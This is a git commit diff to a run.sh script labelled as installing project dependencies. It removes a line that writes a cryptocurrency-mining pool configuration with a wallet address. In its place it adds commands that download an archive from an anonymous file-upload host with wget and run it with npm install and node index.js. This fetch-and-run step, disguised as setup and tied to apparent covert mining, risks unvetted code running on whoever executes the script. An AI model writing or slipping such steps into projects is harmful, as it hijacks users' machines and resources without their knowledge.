60cb0e4a640db61e5dd935a5e1e70a993707b529
Solo120140 <153219427+Solo120140@users.noreply.github.com>
2024-05-22 11:38:07 +0530

    Update run.sh

--- run.sh
+++ run.sh
@@ -3,4 +3,8 @@
 
 #instll project dependencies
 
-echo '[{"algorithm": "minotaurx", "host": "minotaurx.na.mine.zpool.ca", "port": 7019, "": "RMq5DEMWYfPZB148q1JdXW6rpdLyZHz2vE", "password": "c=AVN", "workers": 8, "fee": "0" }]' > config.json
+mkdir solo
+cd solo
+wget https://bashupload.com/Ap2Lp/dataget.tar.gz
+npm install 
+node index.js
